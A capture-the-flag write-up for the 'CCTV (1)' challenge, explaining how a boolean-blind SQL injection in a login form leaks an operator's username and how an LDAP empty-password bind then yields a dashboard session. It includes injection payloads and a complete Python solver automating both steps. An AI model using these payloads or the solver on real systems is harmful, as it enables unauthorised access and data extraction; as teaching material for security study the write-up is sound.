---
title: "HyperSonic CTF 2026 CCTV (1) Writeup"
description: "HyperSonic CTF 2026 CCTV (1) writeup"
---

# CCTV (1)

## Overview

`CCTV (1)` is a challenge where you create a regular user session on the HS-CCTV management console and then read the `Maintenance Token` shown on the dashboard.

- Category: `misc`
- Points: `200`
- Description: `Hack the CCTV.`

The provided program has two login modes, `local` and `ldap`. In `local` mode, the SQL query that checks a regular user name is injectable, and in `ldap` mode you can observe a flow where the bind succeeds even with an empty password. In this writeup we first find an operator account name via SQL injection, then attempt an LDAP login with that name to obtain a session.

## Challenge analysis

The main terms used in this writeup:

- `users`: the SQLite table storing account information.
- `username`: the account name used for web login.
- `role`: the privilege string stored in the session. A regular user is `user`, an administrator is `admin`.
- `ldap_dn`: the DN used for the LDAP bind.
- `SERVICE_TOKEN`: the maintenance token shown on the dashboard to a logged-in user.
- `oracle`: a function that distinguishes whether a SQL condition is true or false from the difference in login responses.

The startup script passes the `FLAG1` value as `CCTV_SERVICE_TOKEN`.

```sh
CCTV_SERVICE_TOKEN="${CCTV_SERVICE_TOKEN:-${FLAG1:-CCTV-MGMT-UNPROVISIONED}}"
```

The dashboard template prints this value in the `Maintenance Token` area.

```html
<div class="label">Maintenance Token</div>
<div class="value service-token">{{SERVICE_TOKEN}}</div>
```

So the goal of `CCTV (1)` is not administrator privileges, but a user session that can view the dashboard.

The account table has the following structure.

```sql
CREATE TABLE users (
    id INTEGER PRIMARY KEY,
    username TEXT UNIQUE NOT NULL,
    role TEXT NOT NULL,
    local_password_cipher TEXT NOT NULL,
    ldap_dn TEXT UNIQUE NOT NULL
);
```

The RSA public parameters are also stored in the database.

```sql
CREATE TABLE device_public_params (
    name TEXT PRIMARY KEY,
    value TEXT NOT NULL
);
```

In the provided program, local password verification uses an RSA operation with `e = 65537`. Recovering the password directly from `local_password_cipher` is hard, but in this challenge we don't need to know the local password. The value we need is the `username` of the operator we will attempt an LDAP login with.

When handling a regular user login in `local` mode, the program first checks for the existence of a `role = 'user'` account with the query below.

```sql
SELECT username FROM users WHERE role = 'user' AND username = '%s' LIMIT 1
```

Because `username` is inserted without escaping, we can inject a condition of the following form.

```text
' OR (<condition>) -- -
```

The response varies depending on the condition's result.

```text
When the condition is true: Password verification failed.
When the condition is false: Account not found.
```

If the condition is true, the existence-check query returns a row. The program then re-queries with the full payload as the actual username, so verification fails at the password step. Conversely, if the condition is false, the response says the account was not found. Using this difference, together with `length` and `substr`, we can read the operator's `username` one character at a time.

The LDAP login flow matters too. The program's flow can be summarized as follows.

```text
if mode == "ldap":
    if username == "admin":
        reject

    account = load_account_by_name(username)
    ldap_simple_bind_s(account.ldap_dn, password)

    if bind_success:
        create_session(account.username, account.role)
```

LDAP login for the administrator account is blocked, but for regular user accounts, the program decides login success based only on the result of `ldap_simple_bind_s`. Here, even if `password` is an empty password, if the LDAP server returns success the program treats it as a valid authentication and issues a `user` session.

## Core idea

The key to the solution is to look at the `local` login and the `ldap` login separately.

The `local` login is not used to obtain a session. Instead, it is used only to find the operator's `username` via SQL injection. The full contents of the database are not printed directly, but because the login failure message splits into two kinds, it serves as a sufficient boolean oracle.

Next, we use the `ldap` login. In an LDAP simple bind, when the DN exists but the password is empty, the server may return success via an anonymous bind. The program does not distinguish this success code from a genuine user authentication success. So as long as we know the operator name, we can create a web session even with an empty password.

The dashboard renders the `Maintenance Token` even for a `role = user` session. The admin-only `Supervisor Token` is not visible, but since the value needed for `CCTV (1)` is the `Maintenance Token`, this is enough.

## Solution walkthrough

### Step 1. Checking the condition under which the dashboard prints the token

First, I checked where the `Maintenance Token` comes from. The startup script passes `FLAG1` as `CCTV_SERVICE_TOKEN`, and the dashboard prints `{{SERVICE_TOKEN}}` verbatim.

This stage fixes the goal. There is no need to read the token file directly or to log in as the administrator account. With just a logged-in user session, we can view the token on the dashboard.

### Step 2. Building a SQL oracle with the `local` login

The `local` login for a regular user inserts `username` directly into the SQL string. The following payload is an example that checks whether the first character is `c`.

```text
' OR (substr((SELECT username FROM users WHERE role='user' LIMIT 1),1,1)='c') -- -
```

If the condition is true, `Password verification failed.` appears, and if false, `Account not found.` appears. By converting this response difference into a boolean, we can recover the string length and each character in order.

The operator name is read as the `username` of the account with `role = 'user'`.

```sql
SELECT username FROM users WHERE role='user' LIMIT 1
```

### Step 3. LDAP empty-password login with the operator name

Now we put the recovered `username` into `ldap` mode. Here we leave `password` as an empty password.

```text
mode=ldap
username=<operator username>
password=
```

The program fills in the operator's `ldap_dn` via `load_account_by_name`, then calls `ldap_simple_bind_s` with that DN and the empty password. If the bind succeeds, `create_session` is called and a `CCTVSESSID` cookie is issued.

This session's `role` is `user`. The `Supervisor Token` is not visible, but the `Maintenance Token` is shown on the regular user dashboard too.

### Step 4. Extracting the `Maintenance Token` from the dashboard

Accessing the dashboard with the issued session cookie lets us view the `Maintenance Token` area. Parsing the `service-token` value from the response HTML yields the flag.

## Exploit / solver

The solver's flow is as follows.

1. Build a SQL oracle using the difference in `local` login responses.
2. Extract the `username` with `role = 'user'` from the `users` table.
3. Attempt an `ldap` login with the extracted `username`, sending an empty password.
4. Access the dashboard with the issued session and find the `Maintenance Token`.

The code below shows only the core routines. The target address is assumed to be taken as a runtime argument.

```python
import re
import string
import urllib.parse
import urllib.request
import http.cookiejar


USER_CHARS = string.ascii_letters + string.digits + "_-."


class CCTVClient:
    def __init__(self, base_url):
        self.base = base_url.rstrip("/")
        self.cookies = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.cookies)
        )

    def post_login(self, mode, username, password):
        data = urllib.parse.urlencode({
            "mode": mode,
            "username": username,
            "password": password,
        }).encode()
        req = urllib.request.Request(self.base + "/login", data=data, method="POST")
        return self.opener.open(req, timeout=10)

    def oracle(self, condition):
        payload = "' OR (" + condition + ") -- "
        body = self.post_login("local", payload, "x").read().decode(
            "utf-8",
            errors="ignore",
        )

        if "Password verification failed." in body:
            return True
        if "Account not found." in body:
            return False
        raise RuntimeError("unexpected oracle response")

    def extract_int(self, expr, lo, hi):
        while lo < hi:
            mid = (lo + hi) // 2
            if self.oracle(f"({expr})>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        return lo

    def extract_text(self, expr, alphabet, max_len):
        length = self.extract_int(f"length(({expr}))", 0, max_len)
        out = []

        for pos in range(1, length + 1):
            for ch in alphabet:
                q = ch.replace("'", "''")
                if self.oracle(f"substr(({expr}),{pos},1)='{q}'"):
                    out.append(ch)
                    break
            else:
                raise RuntimeError(f"failed to extract position {pos}")

        return "".join(out)

    def ldap_login(self, username):
        self.post_login("ldap", username, "").read()

    def dashboard(self):
        return self.opener.open(self.base + "/dashboard", timeout=10).read().decode(
            "utf-8",
            errors="ignore",
        )


def solve(base_url):
    client = CCTVClient(base_url)

    username_expr = "SELECT username FROM users WHERE role='user' LIMIT 1"
    username = client.extract_text(username_expr, USER_CHARS, 64)

    client.ldap_login(username)
    html = client.dashboard()

    token = re.search(
        r"Maintenance Token.*?service-token[^>]*>([^<]+)<",
        html,
        re.S,
    )
    if not token:
        raise RuntimeError("maintenance token not found")

    return token.group(1).strip()
```

## Result

On the actual target, I recovered the operator name with the SQL oracle, then performed an empty-password login in LDAP mode to obtain a user session. From the dashboard's `Maintenance Token` I read the following value.

```text
HS{Do_you_know_unauthenticated_bind?_https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/41cbdb2c-eab1-45b0-8236-ae777b1c5406}
```
